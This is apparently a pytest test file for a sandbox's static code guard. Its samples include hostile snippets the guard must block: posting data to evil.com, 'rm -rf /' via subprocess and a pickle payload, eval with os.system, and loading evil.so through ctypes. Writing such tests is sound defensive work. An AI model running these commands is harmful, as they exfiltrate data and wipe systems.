from __future__ import annotations

import pytest

from src.sandbox.static_guard import check_static


@pytest.mark.unit
def test_safe_code_passes() -> None:
    code = (
        "import pandas as pd\n"
        "import numpy as np\n"
        "from pathlib import Path\n"
        "df = pd.read_csv('/tmp/data.csv')\n"
        "df.dropna(inplace=True)\n"
        "print(df.describe())\n"
    )
    safe, reason = check_static(code)
    assert safe is True
    assert reason == ""


@pytest.mark.unit
def test_banned_import_requests() -> None:
    code = (
        "import requests\n"
        "import pandas as pd\n"
        "df = pd.read_csv('data.csv')\n"
        "requests.post('https://evil.com', data=df.to_json())\n"
    )
    safe, reason = check_static(code)
    assert safe is False
    assert "requests" in reason


@pytest.mark.unit
def test_banned_import_subprocess() -> None:
    code = (
        "import subprocess\n"
        "subprocess.run(['rm', '-rf', '/'])\n"
    )
    safe, reason = check_static(code)
    assert safe is False
    assert "subprocess" in reason


@pytest.mark.unit
def test_os_import_now_allowed() -> None:
    """import os is allowed; dangerous calls (os.system, os.popen) caught by regex."""
    code = "import os\nos.path.join('/tmp', 'data.csv')\n"
    safe, reason = check_static(code)
    assert safe is True
    assert reason == ""


@pytest.mark.unit
def test_banned_import_dotted() -> None:
    code = "from urllib.request import urlopen\nurlopen('http://evil.com')\n"
    safe, reason = check_static(code)
    assert safe is False


@pytest.mark.unit
def test_banned_pattern_eval() -> None:
    code = "x = eval('__import__(\"os\").system(\"ls\")')\n"
    safe, reason = check_static(code)
    assert safe is False
    assert "eval" in reason


@pytest.mark.unit
def test_banned_pattern_os_system() -> None:
    code = (
        "import sys\n"
        "import os\n"
        "os.system('ls -la')\n"
    )
    safe, reason = check_static(code)
    assert safe is False


@pytest.mark.unit
def test_banned_pattern_requests_attribute() -> None:
    """Even without an import statement, requests.* patterns are caught."""
    code = "requests.post('https://evil.com', json={})\n"
    safe, reason = check_static(code)
    assert safe is False
    assert "requests" in reason


@pytest.mark.unit
def test_syntax_error_rejected() -> None:
    code = "import pandas as pd\nthis is not valid python {{{{{\n"
    safe, reason = check_static(code)
    assert safe is False
    assert "syntax error" in reason.lower()


@pytest.mark.unit
def test_legitimate_imports_allowed() -> None:
    code = (
        "import pandas as pd\n"
        "import numpy as np\n"
        "from sklearn.linear_model import LinearRegression\n"
        "from scipy import stats\n"
        "import matplotlib\n"
        "matplotlib.use('Agg')\n"
        "import matplotlib.pyplot as plt\n"
        "from collections import Counter\n"
        "import json, csv, sys\n"
    )
    safe, reason = check_static(code)
    assert safe is True
    assert reason == ""


@pytest.mark.unit
def test_shutil_pattern_caught() -> None:
    code = "import shutil\nshutil.rmtree('/tmp/data')\n"
    safe, reason = check_static(code)
    assert safe is False


@pytest.mark.unit
def test_ctypes_import_caught() -> None:
    code = "import ctypes\nctypes.CDLL('./evil.so')\n"
    safe, reason = check_static(code)
    assert safe is False
    assert "ctypes" in reason


@pytest.mark.unit
def test_pickle_import_caught() -> None:
    code = "import pickle\npickle.loads(b'cos\\nsystem\\n(S\"rm -rf /\"\\ntR.')\n"
    safe, reason = check_static(code)
    assert safe is False
    assert "pickle" in reason


@pytest.mark.unit
def test_safe_file_write_allowed() -> None:
    """pathlib Path usage without unlink/rmdir is safe."""
    code = (
        "from pathlib import Path\n"
        "out = Path('/tmp') / 'cleaned_data.csv'\n"
        "df.to_csv(out, index=False)\n"
    )
    safe, reason = check_static(code)
    assert safe is True
    assert reason == ""


@pytest.mark.unit
def test_pathlib_unlink_caught() -> None:
    code = (
        "from pathlib import Path\n"
        "Path('/tmp/data.csv').unlink()\n"
    )
    safe, reason = check_static(code)
    assert safe is False
    assert "unlink" in reason


@pytest.mark.unit
def test_banned_dotted_import_requests() -> None:
    code = "import urllib.request\nresponse = urllib.request.urlopen('http://evil.com')\n"
    safe, reason = check_static(code)
    assert safe is False
    assert "urllib.request" in reason
